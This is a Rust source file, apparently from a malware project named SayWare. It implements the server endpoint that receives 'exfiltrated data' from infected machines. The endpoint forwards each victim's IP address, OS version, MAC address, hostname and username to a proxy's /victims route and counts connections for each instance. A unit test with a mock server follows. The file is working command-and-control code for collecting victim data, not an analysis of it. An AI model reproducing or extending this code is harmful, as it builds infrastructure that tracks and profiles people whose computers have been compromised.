// SPDX-FileCopyrightText: 2025 The SayWare development team
//
// SPDX-License-Identifier: GPL-3.0-or-later

use crate::State;
use poem::{
    Result, error,
    web::{Data, RemoteAddr},
};
use poem_openapi::{OpenApi, payload::Json};
use sayware_types::ExfiltratedData;
use serde::{Deserialize, Serialize};
use uuid::Uuid;

#[derive(Deserialize, Serialize, Default)]
struct InstanceData {
    connection_number: u32,
}

#[derive(Serialize)]
struct VictimData {
    identifier: Uuid,
    address: Option<String>,
    operating_system_version: String,
    mac_address: Option<String>,
    hostname: Option<String>,
    username: Option<String>,
}

pub struct Exfiltration;

#[OpenApi]
impl Exfiltration {
    #[oai(path = "/", method = "post")]
    async fn send_exfiltrated_data(
        &self,
        state: Data<&State>,
        remote_address: &RemoteAddr,
        data: Json<ExfiltratedData>,
    ) -> Result<()> {
        let mut instance_data = state
            .0
            .proxy
            .get(format!(
                "{}/instances/{}",
                state.0.proxy_url, state.0.instance_identifier
            ))
            .send()
            .await
            .map_err(error::InternalServerError)?
            .error_for_status()
            .map_err(error::InternalServerError)?
            .json::<InstanceData>()
            .await
            .unwrap_or(InstanceData::default());

        instance_data.connection_number += 1;

        state
            .0
            .proxy
            .put(format!(
                "{}/instances/{}",
                state.0.proxy_url, state.0.instance_identifier
            ))
            .json(&instance_data)
            .send()
            .await
            .map_err(error::InternalServerError)?
            .error_for_status()
            .map_err(error::InternalServerError)?;

        let identifier = Uuid::new_v4();

        state
            .0
            .proxy
            .post(format!(
                "{}/victims/{}/{}",
                state.0.proxy_url, identifier, state.0.instance_identifier
            ))
            .json(&VictimData {
                identifier,
                address: remote_address
                    .0
                    .as_socket_addr()
                    .map(|socket| socket.ip().to_string()),
                operating_system_version: data.0.operating_system_version,
                mac_address: data.0.mac_address,
                hostname: data.0.hostname,
                username: data.0.username,
            })
            .send()
            .await
            .map_err(error::InternalServerError)?
            .error_for_status()
            .map_err(error::InternalServerError)?;

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use crate::{
        State,
        api::routes::{Exfiltration, exfiltration::InstanceData},
    };
    use poem::{EndpointExt, Route, test::TestClient};
    use poem_openapi::OpenApiService;
    use reqwest::Client;
    use uuid::Uuid;
    use wiremock::{Mock, MockServer, ResponseTemplate, matchers};

    #[tokio::test]
    async fn test_send_exfiltrated_data() {
        let mock_server = MockServer::start().await;
        let instance_identifier = Uuid::new_v4();

        Mock::given(matchers::method("GET"))
            .and(matchers::path_regex(r"/instances/.*"))
            .respond_with(ResponseTemplate::new(200).set_body_json(InstanceData {
                connection_number: 5,
            }))
            .mount(&mock_server)
            .await;

        Mock::given(matchers::method("PUT"))
            .and(matchers::path_regex(r"/instances/.*"))
            .respond_with(ResponseTemplate::new(200))
            .mount(&mock_server)
            .await;

        Mock::given(matchers::method("POST"))
            .and(matchers::path_regex(r"/victims/.*"))
            .respond_with(ResponseTemplate::new(200))
            .mount(&mock_server)
            .await;

        let state = State {
            proxy: Client::new(),
            proxy_url: mock_server.uri().parse().unwrap(),
            instance_identifier,
        };

        let api = OpenApiService::new(Exfiltration, "Sayware", "0.1.0");
        let application = Route::new().nest("/", api).data(state);
        let client = TestClient::new(application);

        client
            .post("/")
            .header("Content-Type", "application/json")
            .body(r#"{"operating_system_version": "Windows 10.0 19045"}"#)
            .send()
            .await
            .assert_status_is_ok();
    }
}
